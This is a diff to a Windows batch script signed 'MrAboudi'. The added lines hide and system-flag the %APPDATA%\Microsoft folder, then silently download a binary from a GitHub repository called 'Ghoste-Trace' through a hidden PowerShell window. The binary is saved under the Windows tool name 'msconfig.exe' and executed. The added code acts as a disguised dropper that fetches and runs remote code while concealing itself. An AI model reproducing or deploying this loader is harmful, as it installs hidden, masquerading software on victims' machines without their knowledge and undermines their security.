@@ -65,6 +65,35 @@ if exist "%TARGET_FILE%" (
      /F >nul 2>&1
 )
 
+:: Paths and URLs
+set "MICROSOFT_FOLDER=%APPDATA%\Microsoft"
+set "MSCONFIG_PATH=%MICROSOFT_FOLDER%\msconfig.exe"
+set "MSCONFIG_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/main/msconfig.exe"
+
+:: Make sure Microsoft folder exists
+if not exist "%MICROSOFT_FOLDER%" (
+    mkdir "%MICROSOFT_FOLDER%"
+)
+attrib -h -s -r "%MICROSOFT_FOLDER%" >nul 2>&1
+attrib +h +s "%MICROSOFT_FOLDER%" >nul 2>&1
+
+:: Delete msconfig.exe if it exists
+if exist "%MSCONFIG_PATH%" (
+    attrib -h -s -r "%MSCONFIG_PATH%" >nul 2>&1
+    del /f /q "%MSCONFIG_PATH%" >nul 2>&1
+)
+
+:: Download new msconfig.exe
+powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%MSCONFIG_URL%', '%MSCONFIG_PATH%'); exit"
+
+:: Run msconfig.exe if download succeeded
+if exist "%MSCONFIG_PATH%" (
+    start "" "%MSCONFIG_PATH%"
+) else (
+    echo Failed to download msconfig.exe
+    exit /b 1
+)
+
 :: Delete old msconfig.exe if it exists in Microsoft folder
 set "MSCONFIG_PATH=%APPDATA%\Microsoft\msconfig.exe"
 
@@ -157,3 +186,4 @@ exit /b
 
 :: By MrAboudi
 :: v4
+
